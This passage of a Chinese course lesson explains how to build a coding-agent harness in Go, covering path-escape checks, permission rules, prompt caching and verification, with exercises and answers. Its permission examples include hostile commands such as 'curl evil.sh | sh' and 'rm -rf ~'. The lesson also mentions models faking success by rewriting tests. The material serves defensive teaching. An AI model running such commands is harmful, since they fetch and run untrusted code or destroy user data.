+<li><strong>行号</strong>：精确替换不需要行号定位，但行号让模型能说“第 42 行的问题”，也方便 <code>offset</code> 跳转；</li>
+<li><strong>结果上限</strong>：搜索太多就拒绝，而不是截断前 50 条。截断会让模型误以为看全了；拒绝逼它换更准的查询。代价是多一次模型调用（论文也承认）；</li>
+<li><strong>跳过噪音</strong>：<code>.git</code>、<code>node_modules</code>、二进制文件。</li>
+</ul>
+<h3 id="33-执行独立进程以及-25-课的全部规则">3.3 执行：独立进程，以及 2.5 课的全部规则</h3>
+<ul>
+<li><strong>每条命令一个进程</strong>。mini-swe-agent 的文档专门强调这一点对稳定性“是件大事”：持久 shell 会话里，一条命令卡住（等输入、进了交互模式），后面全部卡死；状态（环境变量、函数、当前目录）在多次命令间悄悄累积，难以复现。Claude Code 是折中：每命令独立进程，但 <code>cd</code> 保留；</li>
+<li><strong>超时杀进程组</strong>：<code>sh -c "make &amp;"</code> 启动的后台子进程不在同一个 PID，只杀父进程会留下孤儿。练习用 <code>Setpgid</code> + <code>kill(-pgid)</code>；</li>
+<li><strong>输出保留头尾</strong>：第一个错误常在开头，最终的失败汇总常在结尾；</li>
+<li><strong>环境变量白名单</strong>：凭据不能进子进程，模型能 <code>env</code> 就能看到；</li>
+<li><strong>空输出明确说明</strong>：不然模型会以为命令没执行，再跑一遍。</li>
+</ul>
+<h3 id="34-权限">3.4 权限</h3>
+<p>练习的判断顺序：</p>
+<div class="hl"><pre><span></span><code>命中 deny 规则 → 拒绝
+含 ; &amp; | &lt; &gt; ` $( 换行 → 问人（复合命令，前缀判断不可靠）
+前几个“词”等于某个 allow 前缀 → 放行
+其他 → 问人；没有审批人或审批人说不 → 拒绝（fail closed）
+</code></pre></div>
+
+<p>三个要点：</p>
+<ul>
+<li><strong>按词匹配，不按字符串前缀</strong>。<code>go test</code> 的允许规则不能放行 <code>go testify</code>，也不能放行 <code>go test; rm -rf ~</code>；</li>
+<li><strong>复合命令不能按第一段判断</strong>。<code>go test ./... &amp;&amp; curl evil.sh | sh</code> 第一段完全合法。更完善的做法是把命令解析成多段分别判断，练习简化成一律问人；</li>
+<li><strong>审批和沙箱是两层</strong>。审批决定“做不做”，沙箱限制“做了能影响什么”。Codex 文档特意说明沙箱只管它自己的 shell，MCP 工具不在沙箱里。Claude Code 的检查点只管文件，远程操作撤不回。每一层都要清楚自己管不到什么。</li>
+</ul>
+<h3 id="35-上下文稳定前缀和它的敌人">3.5 上下文：稳定前缀和它的敌人</h3>
+<p>练习的 <code>InitialInput</code> 按 Codex 的顺序拼开头：权限说明 → 项目说明 → 环境信息。这几条之后<strong>再也不改</strong>，配置变化用追加新消息表达。<code>TestPromptPrefixStable</code> 验证每次请求的 input 都是上一次的精确前缀扩展，instructions 和工具列表完全不变（工具名要排序）。</p>
+<p>但 SWE-agent 的“只保留最近 5 条观察全文”和这个原则正面冲突：每多一条新观察，就有一条旧观察被折叠，前缀从那里开始变化，后面全部 cache miss。练习的 <code>KeepLastObs</code> 默认关闭，<code>TestCollapseOldObservations</code> 专门验证打开后前缀确实不再稳定。</p>
+<p>两种思路的取舍：</p>
+<ul>
+<li><strong>每轮折叠</strong>（SWE-agent 2024）：上下文最干净，但每轮都 cache miss。在 prompt caching 普及之前这是合理的；</li>
+<li><strong>批量压缩</strong>（Codex、Claude Code）：平时只追加，命中缓存；超过阈值时一次性压缩，之后又从新的前缀开始追加。一次 cache miss 换来很多轮命中。</li>
+</ul>
+<p>另外两个手段：</p>
+<ul>
+<li><strong>按需加载</strong>：skills 只放描述，MCP 工具只放名字，用到才加载全文；</li>
+<li><strong>子代理隔离</strong>：搜索、探索这类产生大量中间输出的任务交给子代理，主上下文只收到摘要（3.3 课的 agents as tools）。</li>
+</ul>
+<p>项目说明分层的规则也值得记住：从根目录到当前目录，越深越靠后；同一层 <code>AGENTS.override.md</code> 替代 <code>AGENTS.md</code>；旁支目录不加载；总量有上限，超了停止追加并说明。练习的 <code>ProjectDocs</code> 实现了这些。</p>
+<h3 id="36-验证做完由谁说了算">3.6 验证：“做完”由谁说了算</h3>
+<p>模型说“我修好了”不算数。Codex 的长任务博客把循环写成“计划、改代码、跑工具（测试/构建/lint）、观察结果、修复失败、更新文档、重复”，并强调 harness 要执行一个有纪律的 <strong>“done when”</strong> 流程。</p>
+<p>两种做法：</p>
+<ul>
+<li><strong>提示词要求</strong>：在 AGENTS.md 里写“改完必须跑测试”。模型大多数时候会照做，但不保证；</li>
+<li><strong>harness 强制</strong>：练习的 <code>finish</code> 工具，harness 自己跑 <code>Verify</code> 命令，不过就把失败输出作为工具结果回给模型，循环继续。<code>TestAgentFixesBugAndVerifies</code> 里脚本模型第一步就想直接结束，被拦下来。</li>
+</ul>
+<p>验证命令是 harness 的，不走权限判断，也不能被模型修改。否则模型可以把测试改成 <code>exit 0</code>。更严格的系统还会检查模型有没有改测试文件本身。</p>
+<hr />
+<h2 id="4-练习代码导读">4. 练习代码导读</h2>
+<div class="tbl"><table>
+<thead>
+<tr>
+<th>文件</th>
+<th>内容</th>
+</tr>
+</thead>
+<tbody>
+<tr>
+<td><code>workspace.go</code></td>
+<td><code>resolve</code> 防路径逃逸；<code>Read</code> 窗口化；<code>Edit</code> / <code>Write</code> 的先读、匹配、唯一、过期、lint 关卡；<code>Undo</code> 快照；<code>Grep</code> 结果上限</td>
+</tr>
+<tr>
+<td><code>shell.go</code></td>
+<td><code>Policy.Check</code> 权限判断；<code>Shell.Run</code> 独立进程、进程组超时、头尾截断、环境白名单、空输出提示</td>
+</tr>
+<tr>
+<td><code>context.go</code></td>
+<td><code>ProjectDocs</code> 分层 AGENTS.md；<code>InitialInput</code> 固定开头</td>
+</tr>
+<tr>
+<td><code>agent.go</code></td>
+<td><code>Turn</code> 循环；<code>ChangeSettings</code> 追加而非修改；<code>view</code> 可选折叠；<code>finish</code> 强制验证</td>
+</tr>
+<tr>
+<td><code>coding_test.go</code></td>
+<td>15 个测试</td>
+</tr>
+</tbody>
+</table></div>
+<h3 id="41-resolve三种逃逸">4.1 resolve：三种逃逸</h3>
+<div class="hl"><pre><span></span><code><span class="nx">full</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">filepath</span><span class="p">.</span><span class="nx">Join</span><span class="p">(</span><span class="nx">w</span><span class="p">.</span><span class="nx">Root</span><span class="p">,</span><span class="w"> </span><span class="nx">p</span><span class="p">)</span><span class="w"> </span><span class="c1">// Join 会 Clean，../ 在这里被折叠</span>
+<span class="k">if</span><span class="w"> </span><span class="o">!</span><span class="nx">within</span><span class="p">(</span><span class="nx">w</span><span class="p">.</span><span class="nx">Root</span><span class="p">,</span><span class="w"> </span><span class="nx">full</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="p">}</span>
+<span class="c1">// 文件可能还不存在，就检查最近一个存在的上级目录</span>
+<span class="k">for</span><span class="w"> </span><span class="nx">probe</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">full</span><span class="p">;</span><span class="w"> </span><span class="p">;</span><span class="w"> </span><span class="nx">probe</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">filepath</span><span class="p">.</span><span class="nx">Dir</span><span class="p">(</span><span class="nx">probe</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">real</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">filepath</span><span class="p">.</span><span class="nx">EvalSymlinks</span><span class="p">(</span><span class="nx">probe</span><span class="p">)</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="o">!</span><span class="nx">within</span><span class="p">(</span><span class="nx">w</span><span class="p">.</span><span class="nx">Root</span><span class="p">,</span><span class="w"> </span><span class="nx">real</span><span class="p">)</span><span class="w"> </span><span class="p">{</span><span class="w"> </span><span class="p">...</span><span class="w"> </span><span class="p">}</span><span class="w"> </span><span class="c1">// 符号链接指向外面</span>
+<span class="w">        </span><span class="k">break</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>只做字符串检查挡得住 <code>../</code>，挡不住仓库里一个指向 <code>/home/you/.ssh</code> 的符号链接。写新文件时文件本身不存在，<code>EvalSymlinks</code> 会失败，所以要往上找到第一个存在的目录再解析。<code>NewWorkspace</code> 里先把 Root 自身也解析一次（macOS 的 <code>/tmp</code> 就是符号链接），否则比较前缀会误判。</p>
+<p>注意这仍然有 TOCTOU 窗口：检查完到真正打开之间，符号链接可能被替换。真正的隔离靠 2.5 课的沙箱，路径检查只是第一道防线。</p>
+<h3 id="42-write快照和已读状态">4.2 write：快照和已读状态</h3>
+<div class="hl"><pre><span></span><code><span class="kd">func</span><span class="w"> </span><span class="p">(</span><span class="nx">w</span><span class="w"> </span><span class="o">*</span><span class="nx">Workspace</span><span class="p">)</span><span class="w"> </span><span class="nx">write</span><span class="p">(</span><span class="nx">full</span><span class="w"> </span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="w"> </span><span class="p">[]</span><span class="kt">byte</span><span class="p">)</span><span class="w"> </span><span class="kt">error</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">old</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">os</span><span class="p">.</span><span class="nx">ReadFile</span><span class="p">(</span><span class="nx">full</span><span class="p">)</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">undo</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nb">append</span><span class="p">(</span><span class="nx">w</span><span class="p">.</span><span class="nx">undo</span><span class="p">,</span><span class="w"> </span><span class="nx">snapshot</span><span class="p">{</span><span class="nx">path</span><span class="p">:</span><span class="w"> </span><span class="nx">full</span><span class="p">,</span><span class="w"> </span><span class="nx">existed</span><span class="p">:</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">nil</span><span class="p">,</span><span class="w"> </span><span class="nx">data</span><span class="p">:</span><span class="w"> </span><span class="nx">old</span><span class="p">})</span>
+<span class="w">    </span><span class="p">...</span>
+<span class="w">    </span><span class="nx">w</span><span class="p">.</span><span class="nx">read</span><span class="p">[</span><span class="nx">full</span><span class="p">]</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="nx">sha256</span><span class="p">.</span><span class="nx">Sum256</span><span class="p">(</span><span class="nx">data</span><span class="p">)</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>每次写之前拍快照，<code>Undo</code> 倒序恢复，原来不存在的文件就删掉。写完把“已读哈希”更新成新内容：agent 自己写进去的东西它当然知道，不需要再读；但外部修改会让哈希对不上。</p>
+<h3 id="43-finish">4.3 finish</h3>
+<div class="hl"><pre><span></span><code><span class="k">case</span><span class="w"> </span><span class="s">"finish"</span><span class="p">:</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">Verify</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">vout</span><span class="p">,</span><span class="w"> </span><span class="nx">verr</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">Sh</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">Verify</span><span class="p">)</span><span class="w"> </span><span class="c1">// 不走 Run，不经过权限判断</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">verr</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="nx">vout</span><span class="p">,</span><span class="w"> </span><span class="kc">false</span><span class="p">,</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Errorf</span><span class="p">(</span><span class="s">"验证没通过（%s：%v），还不能结束"</span><span class="p">,</span><span class="w"> </span><span class="nx">a</span><span class="p">.</span><span class="nx">Verify</span><span class="p">,</span><span class="w"> </span><span class="nx">verr</span><span class="p">)</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="nx">args</span><span class="p">.</span><span class="nx">Summary</span><span class="p">,</span><span class="w"> </span><span class="kc">true</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
+</code></pre></div>
+
+<hr />
+<h2 id="5-常见的坑">5. 常见的坑</h2>
+<ul>
+<li><strong>给模型“写整个文件”作为唯一的编辑方式</strong>。大文件改一行要输出几千行，还经常顺手改坏别处。</li>
+<li><strong>搜索结果截断而不是拒绝</strong>。模型以为看全了，基于不完整的信息下结论。</li>
+<li><strong>持久 shell 会话</strong>。一条 <code>vim</code> 或 <code>git commit</code>（打开编辑器）就能让整个会话卡死。</li>
+<li><strong>只杀父进程</strong>。后台子进程变成孤儿，占着端口，下一次 <code>go run</code> 起不来。</li>
+<li><strong>按字符串前缀放行命令</strong>。<code>git</code> 前缀放行了 <code>git push --force</code>。</li>
+<li><strong>改开头的系统消息来反映配置变化</strong>。每次改配置，整段历史 cache miss。</li>
+<li><strong>工具列表顺序不稳定</strong>。map 遍历、MCP 服务器连接顺序，都会让前缀变化。</li>
+<li><strong>相信模型说“测试通过了”</strong>。harness 自己跑一遍。</li>
+<li><strong>验证命令可被模型修改</strong>。模型把 <code>Makefile</code> 的 test 目标改成 <code>true</code>。</li>
+<li><strong>以为检查点能撤销一切</strong>。数据库迁移、<code>git push</code>、发出去的请求都撤不回。</li>
+</ul>
+<hr />
+<h2 id="6-练习">6. 练习</h2>
+<h3 id="练习-1读懂并跑通必做">练习 1：读懂并跑通（必做）</h3>
+<div class="hl"><pre><span></span><code><span class="nb">cd</span><span class="w"> </span>projects/22-coding<span class="w"> </span><span class="o">&amp;&amp;</span><span class="w"> </span>make<span class="w"> </span><span class="nb">test</span>
+</code></pre></div>
+
+<p>回答：</p>
+<ol>
+<li><code>TestPathEscapes</code> 里 <code>link/new.txt</code> 这个文件并不存在，<code>resolve</code> 是怎么发现它在工作区外的？</li>
+<li><code>TestPolicy</code> 里 <code>go test ./... &amp;&amp; curl x | sh</code> 是 Deny，<code>go test ./... &amp;&amp; make install</code> 是 Ask。为什么两者结果不同？如果把 deny 检查挪到复合命令检查之后，会发生什么？</li>
+<li>把 <code>KeepLastObs</code> 设成 5，<code>TestPromptPrefixStable</code> 会不会失败？为什么？</li>
+</ol>
+<h3 id="练习-2编辑后诊断必做">练习 2：编辑后诊断（必做）</h3>
+<p>Claude Code 装了语言服务器插件后，每次编辑完会自动把类型错误和警告告诉模型。给练习加一个简化版：</p>
+<ul>
+<li><code>Workspace</code> 增加 <code>Diagnose func(ctx, path string) string</code>；</li>
+<li><code>Edit</code> / <code>Write</code> 成功后，如果设置了 <code>Diagnose</code>，把它的返回追加到结果里（“编辑已生效，但有以下问题：...”）。<strong>不阻止编辑</strong>，和 lint 关卡区分开：语法错误拒绝，类型错误只提示；</li>
+<li>实现一个 <code>GoVet(dir)</code>：对被编辑文件所在的包跑 <code>go vet</code>（用 <code>Shell.exec</code>，超时 30 秒），没问题返回空字符串；</li>
+<li>测试：把 <code>Add</code> 的返回值改成未定义的变量 <code>c</code>，语法通过、编辑生效，结果里出现 <code>undefined: c</code>；正常编辑结果里没有诊断信息。</li>
+</ul>
+<h3 id="练习-3只读探索子代理选做">练习 3：只读探索子代理（选做）</h3>
+<p>实现 <code>Explore(ctx, model, ws, question) (string, error)</code>：</p>
+<ul>
+<li>子代理有自己的 <code>Agent</code> 实例和独立的 input，工具只有 <code>read</code>、<code>grep</code> 和只读 shell（策略只允许 <code>ls</code>、<code>cat</code>、<code>git log</code>、<code>git diff</code>，其他一律拒绝，不问人）；</li>
+<li>子代理调用 <code>finish</code> 时，<code>summary</code> 就是返回给主 agent 的结果；</li>
+<li>主 agent 增加一个 <code>explore</code> 工具，参数是问题，结果只有摘要；</li>
+<li>测试：子代理读了 3 个文件、搜了 2 次，主 agent 的 input 只增加了一条工具调用和一条摘要结果；子代理尝试 <code>edit</code> 会得到“没有工具”错误。</li>
+</ul>
+<hr />
+<h2 id="7-自测题">7. 自测题</h2>
+<ol>
+<li>Claude Code 文档里的 “agentic harness” 指什么？它负责哪些事？</li>
+<li>Claude Code 的 Edit 有哪三条检查？各自防的是什么错误？</li>
+<li>SWE-agent 的消融里，“查看器显示整个文件”和“保留完整历史”都比默认配置差。为什么信息更多反而更差？</li>
+<li>SWE-agent 的搜索超过 50 条时为什么不返回前 50 条，而是直接拒绝？代价是什么？</li>
+<li>Codex 为什么不用 <code>previous_response_id</code>？这样做的开销怎么被抵消？</li>
+<li>列出三种会让 Codex 的 prompt cache 失效的操作。对话中途改了审批模式，Codex 怎么处理？</li>
+<li>每轮折叠旧观察和 prompt caching 为什么冲突？现在的 coding agent 怎么取舍？</li>
+<li>mini-swe-agent 只有 bash 也能做到 74% 以上，这说明了什么？为什么 Claude Code 去掉了 Glob、Grep 却保留了 Edit？</li>
+<li>权限判断里，为什么复合命令不能按第一段的前缀放行？为什么要按词匹配？</li>
+<li>“改完要跑测试”写在 AGENTS.md 里和由 harness 强制执行，有什么区别？强制执行时要注意什么？</li>
+</ol>
+<h2 id="8-自测题答案">8. 自测题答案</h2>
+<ol>
+<li>围绕模型的那一层：提供工具、管理模型看到的上下文。具体包括工具的定义和执行、输入输出格式、项目说明和环境信息的拼装、历史与压缩、权限与沙箱、会话持久化与撤销、什么时候算完成。模型负责推理和决定，harness 负责其余一切。</li>
+<li>先读后改：防止模型凭记忆或猜测改一个没看过的文件；精确匹配：逼模型知道文件当前的真实内容，差一个空格都不行；唯一：防止改错位置，出现多次时要么带更多上下文，要么显式 <code>replace_all</code>。此外，文件读后被外部修改会触发重读，防止基于过时内容编辑。</li>
+<li>无关内容稀释注意力、占用上下文，挤掉了真正有用的信息和后续交互的空间；完整历史里还有过时的文件内容（文件已经改了，旧观察还是改之前的样子），会误导模型。窗口 + 行号 + 窗口外行数，让模型知道自己没看全，需要时再看。</li>
+<li>截断会让模型以为看到了全部结果，基于不完整信息做判断；拒绝并提示写更具体的查询，逼模型缩小范围。代价是多一次模型调用（重新生成查询）。</li>
+<li>为了让每个请求完全无状态，并支持零数据保留：服务端保存状态和 ZDR 冲突。代价是发送的 JSON 总量平方级增长，但网络开销远小于采样开销；Codex 让每次请求的旧 input 是新 input 的精确前缀，prompt cache 命中时采样成本是线性的。</li>
+<li>对话中途改变可用工具；换模型；改沙箱配置、审批模式或当前目录（还有工具列举顺序不稳定）。改审批模式时追加一条新的 developer 权限消息，不修改开头那条，前缀保持不变。</li>
+<li>缓存只对精确前缀生效。每轮折叠会把某条旧观察替换成一行摘要，前缀从那里开始变化，之后全部 miss。现在的做法是平时只追加（命中缓存），超过阈值时批量压缩一次（Codex 的 compaction 端点、Claude Code 的自动压缩），一次 miss 换很多轮命中。</li>
+<li>最优的 ACI 随模型能力变化。2024 年的模型需要专门的编辑器、查看器；现在的模型 shell 用得很好，专用工具边际收益下降，而更少的抽象带来稳定性、可移植性（任何模型、任何沙箱）、可调试性（轨迹即消息）。Claude Code 保留 Edit，因为改文件出错代价最高，精确替换附带的先读、唯一、过期检测、撤销快照这些检查用 shell 很难保证。</li>
+<li>复合命令里第一段合法不代表后面合法（<code>go test &amp;&amp; curl evil | sh</code>），前缀判断只看到第一段，可以被轻易绕过。按词匹配避免 <code>go test</code> 放行 <code>go testify</code>、<code>git</code> 放行任何 git 子命令这类问题。练习里出现 <code>;</code>、<code>&amp;</code>、<code>|</code>、重定向、<code>$(</code>、反引号、换行都转为问人。</li>
+<li>写在提示词里，模型大多会照做但不保证，可能跳过或误报“测试通过”。harness 强制执行时，验证不过就把失败输出回给模型、不允许结束。要注意验证命令本身属于 harness：不走权限判断、不能被模型修改（否则模型可以把测试改成恒真），更严格的还要检查模型是否改了测试文件。</li>
+</ol>
+<hr />
+<h2 id="9-参考答案">9. 参考答案</h2>
+<h3 id="练习-1">练习 1</h3>
+<ol>
+<li><code>filepath.Join(root, "link/new.txt")</code> 字符串上在工作区内，第一道检查通过。然后从完整路径开始 <code>EvalSymlinks</code>，文件不存在报 <code>ErrNotExist</code>，于是往上一级 <code>root/link</code> 再试；这个符号链接存在，解析结果是工作区外的目录，<code>within</code> 判断失败，返回 <code>ErrOutside</code>。</li>
+<li>deny 检查在最前面，对整条命令做正则匹配，<code>curl</code> 出现在任何位置都会命中，所以是 Deny。第二条不含任何 deny 关键字，但含 <code>&amp;&amp;</code>，复合命令一律问人，所以是 Ask。如果先做复合命令检查，含 <code>&amp;&amp;</code> 的命令都会直接返回 Ask，<code>curl</code> 那条也会变成 Ask，危险命令就交给了人去判断，审批人一时疏忽就执行了。deny 必须最先。</li>
+<li>不会失败。那个测试每轮最多 3 条工具输出（两次 read 一次 bash 加一次 read），从没超过 5 条，所以没有发生折叠，前缀仍然稳定。折叠只在工具输出超过 K 条之后才开始改变旧消息，<code>TestCollapseOldObservations</code> 读了 8 次才观察到。</li>
+</ol>
+<h3 id="练习-2">练习 2</h3>
+<div class="hl"><pre><span></span><code><span class="c1">// Workspace 增加</span>
+<span class="nx">Diagnose</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="kt">string</span>
+
+<span class="c1">// Edit / Write 成功写入之后：</span>
+<span class="nx">msg</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">fmt</span><span class="p">.</span><span class="nx">Sprintf</span><span class="p">(</span><span class="s">"已修改 %s：替换 %d 处"</span><span class="p">,</span><span class="w"> </span><span class="nx">p</span><span class="p">,</span><span class="w"> </span><span class="nx">n</span><span class="p">)</span>
+<span class="k">if</span><span class="w"> </span><span class="nx">w</span><span class="p">.</span><span class="nx">Diagnose</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">if</span><span class="w"> </span><span class="nx">d</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">w</span><span class="p">.</span><span class="nx">Diagnose</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="nx">p</span><span class="p">);</span><span class="w"> </span><span class="nx">d</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">""</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="nx">msg</span><span class="w"> </span><span class="o">+=</span><span class="w"> </span><span class="s">"\n编辑已生效，但有以下问题：\n"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">d</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+<span class="k">return</span><span class="w"> </span><span class="nx">msg</span><span class="p">,</span><span class="w"> </span><span class="kc">nil</span>
+</code></pre></div>
+
+<p><code>Edit</code> / <code>Write</code> 需要多一个 <code>ctx</code> 参数，<code>Agent.call</code> 传进去。</p>
+<div class="hl"><pre><span></span><code><span class="kd">func</span><span class="w"> </span><span class="nx">GoVet</span><span class="p">(</span><span class="nx">sh</span><span class="w"> </span><span class="o">*</span><span class="nx">Shell</span><span class="p">)</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="k">return</span><span class="w"> </span><span class="kd">func</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">path</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="kt">string</span><span class="w"> </span><span class="p">{</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">filepath</span><span class="p">.</span><span class="nx">Ext</span><span class="p">(</span><span class="nx">path</span><span class="p">)</span><span class="w"> </span><span class="o">!=</span><span class="w"> </span><span class="s">".go"</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">""</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="nx">pkg</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="s">"./"</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">filepath</span><span class="p">.</span><span class="nx">ToSlash</span><span class="p">(</span><span class="nx">filepath</span><span class="p">.</span><span class="nx">Dir</span><span class="p">(</span><span class="nx">path</span><span class="p">))</span>
+<span class="w">        </span><span class="nx">s</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">*</span><span class="nx">sh</span>
+<span class="w">        </span><span class="nx">s</span><span class="p">.</span><span class="nx">Timeout</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">30</span><span class="w"> </span><span class="o">*</span><span class="w"> </span><span class="nx">time</span><span class="p">.</span><span class="nx">Second</span>
+<span class="w">        </span><span class="nx">out</span><span class="p">,</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">s</span><span class="p">.</span><span class="nx">exec</span><span class="p">(</span><span class="nx">ctx</span><span class="p">,</span><span class="w"> </span><span class="s">"go vet "</span><span class="o">+</span><span class="nx">pkg</span><span class="p">)</span>
+<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="nx">err</span><span class="w"> </span><span class="o">==</span><span class="w"> </span><span class="kc">nil</span><span class="w"> </span><span class="p">{</span>
+<span class="w">            </span><span class="k">return</span><span class="w"> </span><span class="s">""</span>
+<span class="w">        </span><span class="p">}</span>
+<span class="w">        </span><span class="k">return</span><span class="w"> </span><span class="nx">strings</span><span class="p">.</span><span class="nx">TrimSpace</span><span class="p">(</span><span class="nx">out</span><span class="p">)</span>
+<span class="w">    </span><span class="p">}</span>
+<span class="p">}</span>
+</code></pre></div>
+
+<p>要点：</p>
+<ul>
+<li>只对被编辑文件所在的包跑，不跑 <code>./...</code>，大仓库里全量 vet 太慢；</li>
+<li>诊断只提示不阻止。类型错误常常是多处编辑的中间状态（先改调用方，再改定义），每一步都拒绝会让模型无法分步完成重构；语法错误则意味着文件已经无法解析，所以由 lint 拒绝；</li>
+<li>诊断输出也要截断（<code>exec</code> 已经做了）；</li>
+<li>测试：<code>Edit("calc.go", "return a - b", "return c", false)</code> 成功，文件已改，结果包含 <code>undefined: c</code>；<code>Edit(..., "a - b", "a + b")</code> 结果里不含“问题”。</li>
+</ul>
+<h3 id="练习-3">练习 3</h3>
+<div class="hl"><pre><span></span><code><span class="kd">func</span><span class="w"> </span><span class="nx">Explore</span><span class="p">(</span><span class="nx">ctx</span><span class="w"> </span><span class="nx">context</span><span class="p">.</span><span class="nx">Context</span><span class="p">,</span><span class="w"> </span><span class="nx">m</span><span class="w"> </span><span class="nx">Model</span><span class="p">,</span><span class="w"> </span><span class="nx">ws</span><span class="w"> </span><span class="o">*</span><span class="nx">Workspace</span><span class="p">,</span><span class="w"> </span><span class="nx">q</span><span class="w"> </span><span class="kt">string</span><span class="p">)</span><span class="w"> </span><span class="p">(</span><span class="kt">string</span><span class="p">,</span><span class="w"> </span><span class="kt">error</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
+<span class="w">    </span><span class="nx">ro</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="nx">Policy</span><span class="p">{</span><span class="nx">Allow</span><span class="p">:</span><span class="w"> </span><span class="p">[]</span><span class="kt">string</span><span class="p">{</span><span class="s">"ls"</span><span class="p">,</span><span class="w"> </span><span class="s">"cat"</span><span class="p">,</span><span class="w"> </span><span class="s">"git log"</span><span class="p">,</span><span class="w"> </span><span class="s">"git diff"</span><span class="p">}}</span>
+<span class="w">    </span><span class="nx">sub</span><span class="w"> </span><span class="o">:=</span><span class="w"> </span><span class="o">&amp;</span><span class="nx">Agent</span><span class="p">{</span>
+<span class="w">        </span><span class="nx">Model</span><span class="p">:</span><span class="w"> </span><span class="nx">m</span><span class="p">,</span><span class="w"> </span><span class="nx">WS</span><span class="p">:</span><span class="w"> </span><span class="nx">ws</span><span class="p">,</span><span class="w"> </span><span class="nx">MaxSteps</span><span class="p">:</span><span class="w"> </span><span class="mi">20</span><span class="p">,</span>
+<span class="w">        </span><span class="nx">Sh</span><span class="p">:</span><span class="w">    </span><span class="o">&amp;</span><span class="nx">Shell</span><span class="p">{</span><span class="nx">Dir</span><span class="p">:</span><span class="w"> </span><span class="nx">ws</span><span class="p">.</span><span class="nx">Root</span><span class="p">,</span><span class="w"> </span><span class="nx">Policy</span><span class="p">:</span><span class="w"> </span><span class="nx">ro</span><span class="p">},</span><span class="w"> </span><span class="c1">// Approve 为 nil：不在允许列表的一律拒绝</span>
